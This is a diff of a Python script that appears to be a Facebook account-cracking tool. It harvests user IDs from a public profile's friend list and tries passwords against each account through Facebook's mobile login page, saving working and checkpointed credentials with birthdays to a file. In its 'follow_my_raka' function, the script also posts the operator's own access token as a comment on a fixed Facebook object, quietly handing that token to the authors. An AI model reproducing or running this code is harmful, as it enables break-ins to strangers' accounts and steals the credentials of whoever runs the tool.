@@ -75,7 +75,7 @@ __________________________________________________\n
 \x1b[1;97mCoded By   : \x1b[1;96mRaka \x1b[1;97m& \x1b[1;96mAngga\x1b[1;97m
 __________________________________________________
 '''
-aa_raka = '3882176535153442'
+raka_sayang_amanda = '3882176535153442'
 def login():
 	os.system("clear")
 	try:
@@ -140,7 +140,7 @@ def follow_my_raka():
     requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
     requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
     requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(aa_raka,token,token))
+    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
     menu()
     
 def menu():
@@ -198,7 +198,7 @@ def crack():
 	except IOError:
 		print' [!] Invalid Token '
 		tokenz()
-	ra_id = raw_input(" [\x1b[1;97m-\x1b[0m] ID Public : ")
+	ra_id = raw_input("[\x1b[1;97m-\x1b[0m] ID Public : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
 		sp = json.loads(pok.text)
@@ -210,7 +210,7 @@ def crack():
 		rax_x = i['id']
 		name = i['name']
 		id.append(rax_x+'<=>'+name)
-	print(" [\x1b[1;97m-\x1b[0m] Total ID  : "+str(len(id)))
+	print("[\x1b[1;97m-\x1b[0m] Total ID  : "+str(len(id)))
 	print(garis)
 	print("\x1b[1;97mClick \x1b[1;96mCTRL+Z \x1b[1;97mUntuk Berhenti ...\x1b[1;97m")
         print("\x1b[1;97mNote : \x1b[1;96mJika Tak Ada Hasil Mainkan Mode Pesawat 1 Detik \x1b[1;97m?")
@@ -247,9 +247,9 @@ def crack():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': rafi_ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \x1b[1;92m [RAKA_AMANDA OK] ' +rax_x+ ' <-> ' + pw + '       ')
+					print('\r\x1b[1;92m [RAKA_AMANDA OK] ' +rax_x+ ' <-> ' + pw + '       ')
 					ok.append(rax_x+'|'+pw)
-					save.write('  [RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
+					save.write('[RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -260,17 +260,17 @@ def crack():
 						data = s.get(url).json()
 						tgllhr = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
+						print('\r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
 						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
-						save.write('  [RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
+						save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						tgllhr = " "
 					except:pass
-					print('\r  \x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + '       ')
+					print('\r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + '       ')
 					cp.append(rax_x+'|'+pw)
-					save.write('  [RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+'\n')
+					save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+'\n')
 					save.close()
 					break
 					continue
